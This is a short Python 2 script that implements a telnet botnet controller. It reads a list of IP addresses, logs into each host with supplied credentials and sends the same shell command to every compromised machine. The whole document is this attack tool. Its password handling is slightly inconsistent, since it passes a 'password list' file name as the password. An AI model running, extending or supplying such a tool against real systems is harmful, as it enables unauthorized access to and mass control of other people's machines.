#!/usr/bin/python
# -*- coding: utf-8 -*-

import telnetlib
import optparse

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            tn = telnetlib.Telnet(self.host)
            tn.read_until('login:')
            tn.write(self.user + '\n')
            tn.read_until('Password:')
            tn.write(self.password + '\n')
            tn.read_until('$')
            return tn
        except Exception, e:
            print e
            print '[-] Error Connecting'

    def send_command(self, cmd):
        self.session.write(cmd+'\n')
        self.session.read_until('$')


def botnetCommand(command):
    for client in botNet:
        client.send_command(command)
        print '[*] Output from ' + client.host

def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

botNet = []

def main():
    parser = optparse.OptionParser('usage %prog -u <user> -F <password list>')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('-F', dest='passwd', type='string', help='specify password file')
    (options, args) = parser.parse_args()
    user = options.user
    passwd = options.passwd

    if passwd == None or user == None:
        print parser.usage
        exit(0)

    ipFile = open('4switcher_ip8.txt', 'r')
    for ip in ipFile.readlines():
        ip = ip.strip('\n')
        addClient(ip, user, passwd)

    botnetCommand('ls')

if __name__ == '__main__':
	main()

